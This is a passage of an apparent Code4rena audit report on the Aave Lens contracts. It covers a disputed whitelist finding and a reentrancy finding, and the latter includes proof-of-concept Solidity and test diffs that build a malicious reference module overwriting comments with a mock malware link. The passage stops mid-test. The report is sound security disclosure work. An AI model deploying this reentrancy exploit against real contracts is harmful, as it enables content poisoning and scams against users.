into deeper for newer or updated functionality (we won’t be deploying this module yet).</p>\n</blockquote>\n<hr>\n<h2 id=\"m-12-ineffective-whitelist\" style=\"position:relative;\"><a href=\"#m-12-ineffective-whitelist\" aria-label=\"m 12 ineffective whitelist permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/30\">[M-12] Ineffective Whitelist</a></h2>\n<p><em>Submitted by cmichel</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-02-aave-lens/blob/aaf6c116345f3647e11a35010f28e3b90e7b4862/contracts/core/LensHub.sol#L146\">LensHub.sol#L146</a><br></p>\n<p>Creating profiles through <code>LensHub.createProfile</code> requires the caller to be whitelisted.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"10\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_validateCallerIsWhitelistedProfileCreator</span><span class=\"mtk1\">() </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (!</span><span class=\"mtk12\">_profileCreatorWhitelisted</span><span class=\"mtk1\">[</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">]) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Errors</span><span class=\"mtk1\">.</span><span class=\"mtk11\">ProfileCreatorNotWhitelisted</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>However, a single whitelisted account can create as many profiles as they want and send the profile NFT to other users.<br>\nThey can create unlimited profiles on behalf of other users which makes the whitelist not effective.</p>\n<h3 id=\"recommended-mitigation-steps-11\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-11\" aria-label=\"recommended mitigation steps 11 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Consider limiting the number of profile creations per whitelisted user or severely limiting who is allowed to create profiles, basically making profile creation a centralized system.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/30#issuecomment-1042138981\">oneski (Aave Lens) commented</a>:</strong></p>\n<blockquote>\n<p>Declined, this is by design.</p>\n<p>Governance will decide what contracts are allowed to mint via the allowlist. If governance wishes to have a more centralized system, it will only approve contracts that have numerical caps within their code.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/30\">Zer0dot (Aave Lens) disputed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/30#issuecomment-1118548551\">0xleastwood (judge) marked invalid and commented</a>:</strong></p>\n<blockquote>\n<p>I agree with the sponsor, I think this can already be handled by the governance strictly approving contracts with numerical caps or limiting the allowlist of who can create a profile. As such, I’m inclined to mark this as <code>invalid</code> because the recommendation can already be implemented or adhered to by the governance.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/30#issuecomment-1118566774\">0xleastwood (judge) re-assessed as Medium severity and commented</a>:</strong></p>\n<blockquote>\n<p>In light of another issue, I will mark this as a valid issue because <a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/66\">#66</a> outlines a similar concern. The two issues reference different parts of the codebase so I think its fair to keep them distinct. However, I’d normally like to see a bit more detail on how non-whitelisted users can benefit from an infinite minter.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-13-reentrancy-allows-commenter-to-overwrite-own-comments\" style=\"position:relative;\"><a href=\"#m-13-reentrancy-allows-commenter-to-overwrite-own-comments\" aria-label=\"m 13 reentrancy allows commenter to overwrite own comments permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/45\">[M-13] Reentrancy allows commenter to overwrite own comments</a></h2>\n<p><em>Submitted by IllIllI</em></p>\n<p>Since the Lens platform is a blockchain-based social media platform, it’s important that information relevant to users be emitted so that light clients need not continually refer to the blockchain, which can be expensive. From the docs:</p>\n<p><code>Events are emitted at every state-changing function call, in addition to standard ERC721 events. Events often include the timestamp as a specific parameter, which allows for direct consumption using a bloom filter without needing to fetch block context on every event.</code></p>\n<p>As such, it is important that the content of emitted events matches what direct lookups of publication data shows.</p>\n<h3 id=\"impact-1\" style=\"position:relative;\"><a href=\"#impact-1\" aria-label=\"impact 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>Due to the reentrancy bug outlined below, an attacker is able to emit a comment containing some information that does not match the actual information of a post, allowing him/her to trick light clients into responding to a post that they otherwise would have avoided. The attacker can use this to propagate scams, serve malware, or otherwise poison other user’s profiles with unwanted content. Because there is no way to disable publications after the fact, these commenters’ profiles now link to this bad content forever.</p>\n<h3 id=\"proof-of-concept-5\" style=\"position:relative;\"><a href=\"#proof-of-concept-5\" aria-label=\"proof of concept 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>According to the developers in the contest discord, the intention is for the whitelisting of modules to eventually be disabled altogether, or moved to be controlled by a DAO. The main purpose of the whitelist is to make sure that the modules written and used by everyone are built and scoped appropriately, not to limit calls to outside contracts (i.e. the module does what it does in the most efficient manner, using the method requiring the fewest outside contract calls). As such it’s reasonable to assume that at some point in the future, an attacker will be able to find or write a ReferenceModule that enables him/her to trigger a function in a contract he/she owns (e.g. transfer an NFT, triggering an ERC721 pre-transfer approval check callback). Below is a version of this where, for simplicity’s sake, the malicious code is directly in the module rather than being called by a callback somehow.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"11\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/MockReferenceModule.sol.original b/MockReferenceModule.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 2552faf..0fe464b 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/MockReferenceModule.sol.original</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/MockReferenceModule.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -3,23 +3,46 @@</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> pragma solidity 0.8.10;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> import {IReferenceModule} from &#39;../interfaces/IReferenceModule.sol&#39;;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+import {ILensHub} from &#39;../interfaces/ILensHub.sol&#39;;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+import {DataTypes} from &#39;../libraries/DataTypes.sol&#39;;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> contract MockReferenceModule is IReferenceModule {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     function initializeReferenceModule(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 profileId,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 pubId,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         bytes calldata data</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    ) external pure override returns (bytes memory) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    ) external override returns (bytes memory) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 number = abi.decode(data, (uint256));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         require(number == 1, &#39;MockReferenceModule: invalid&#39;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        l = msg.sender;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         return new bytes(0);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    address l;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    bool a;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     function processComment(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 profileId,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 profileIdPointed,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 pubIdPointed</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    ) external override {}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    ) external override {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        if (a) return;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        a = true;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        bytes memory garbage;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        string memory handle = &quot;attack.eth&quot;;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        uint256 pid = ILensHub(l).getProfileIdByHandle(handle);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        ILensHub(l).comment(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            DataTypes.CommentData(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                profileId,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                // make their comment and thus their profile link</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                // to our malicious payload</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                &quot;https://yourCommentIsNowOnALinkToMalware.com/forever&quot;,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                profileIdPointed,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                pubIdPointed,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                ILensHub(l).getCollectModule(profileIdPointed, pubIdPointed),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                garbage,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                address(0x0),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                garbage</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        ));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     function processMirror(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint256 profileId,</span></span></span></code></pre>\n<p>As for triggering the actual attack, the attacker first acquires a profile with a lot of followers either by organically growing a following, stealing a profile’s NFT, or buying access to one. Next, the attacker publishes interesting content with the malicious ReferenceModule, and finally, the attacker publishes an extremely engaging/viral comment to that publication, which will cause lots of other people to respond to it. The comment will emit an event that contains the original comment information, but the module will be able to overwrite the actual published comment on the blockchain with the attacker’s alternate content due to a reentrancy bug where the <code>pubCount</code> can be overwritten:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"12\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_createComment</span><span class=\"mtk1\">(DataTypes.CommentData </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">PublishingLogic</span><span class=\"mtk1\">.</span><span class=\"mtk11\">createComment</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">vars</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">_profileById</span><span class=\"mtk1\">[</span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">profileId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">pubCount</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">1</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">_profileById</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">_pubByIdByProfile</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">_collectModuleWhitelisted</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">_referenceModuleWhitelisted</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">_profileById</span><span class=\"mtk1\">[</span><span class=\"mtk12\">vars</span><span class=\"mtk1\">.</span><span class=\"mtk12\">profileId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">pubCount</span><span class=\"mtk1\">++;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-02-aave-lens/blob/c1d2de2b0609b7d2734ada2ce45c91a73cc54dd9/contracts/core/LensHub.sol#L878-L888\">LensHub.sol#L878-L888</a><br></p>\n<p>The following test uses this altered module and shows that the attacker can emit a different comment than is actually stored by/used for subsequent comments:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"13\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/publishing-comments.spec.ts.original b/publishing-comments.spec.ts</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 471ba68..32dfb3a 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/publishing-comments.spec.ts.original</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/publishing-comments.spec.ts</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -3,6 +3,11 @@ import { expect } from &#39;chai&#39;;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> import { MAX_UINT256, ZERO_ADDRESS } from &#39;../../helpers/constants&#39;;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> import { ERRORS } from &#39;../../helpers/errors&#39;;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> import { cancelWithPermitForAll, getCommentWithSigParts } from &#39;../../helpers/utils&#39;;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+import {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+  getTimestamp,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+  matchEvent,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+  waitForTx,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+} from &#39;../../helpers/utils&#39;;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> import {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   abiCoder,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   emptyCollectModule,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -59,7 +64,7 @@ makeSuiteCleanRoom(&#39;Publishing Comments&#39;, function () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         })</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       ).to.not.be.reverted;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+/**</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     context(&#39;Negatives&#39;, function () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       it(&#39;UserTwo should fail to publish a comment to a profile owned by User&#39;, async function () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         await expect(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -151,8 +156,9 @@ makeSuiteCleanRoom(&#39;Publishing Comments&#39;, function () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         ).to.be.revertedWith(ERRORS.PUBLICATION_DOES_NOT_EXIST);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+/**/</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     context(&#39;Scenarios&#39;, function () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+/**</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       it(&#39;User should create a comment with empty collect module data, reference module, and reference module data, fetched comment data should be accurate&#39;, async function () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         await expect(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">           lensHub.comment({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -175,8 +181,23 @@ makeSuiteCleanRoom(&#39;Publishing Comments&#39;, function () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         expect(pub.collectNFT).to.eq(ZERO_ADDRESS);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         expect(pub.referenceModule).to.eq(ZERO_ADDRESS);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+/**/</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       it(&#39;User should create a post using the mock reference module as reference module, then comment on that post&#39;, async function () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        // user acquires account and sets up the attacking profile</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        await expect(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+          lensHub.createProfile({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            to: mockReferenceModule.address,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            handle: &quot;attack.eth&quot;,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            imageURI: MOCK_PROFILE_URI,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            followModule: ZERO_ADDRESS,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            followModuleData: [],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            followNFTURI: MOCK_FOLLOW_NFT_URI,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+          })</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        ).to.not.be.reverted;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        await lensHub.setDispatcher(FIRST_PROFILE_ID, mockReferenceModule.address);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        // create a post</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         const data = abiCoder.encode([&#39;uint256&#39;], [&#39;1&#39;]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         await expect(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">           lensHub.post({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -189,22 +210,43 @@ makeSuiteCleanRoom(&#39;Publishing Comments&#39;, function () {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">           })</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         ).to.not.be.reverted;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        await expect(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        // create extremely interesting bait comment</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        const BAIT_COMMENT = &quot;https://somethingExtremelyInteresting.com/toGetEngagement&quot;;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        let receipt = await waitForTx(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">           lensHub.comment({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             profileId: FIRST_PROFILE_ID,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            contentURI: MOCK_URI,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            contentURI: BAIT_COMMENT,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             collectModule: emptyCollectModule.address,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             collectModuleData: [],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             profileIdPointed: FIRST_PROFILE_ID,</span></span></span>\n<span 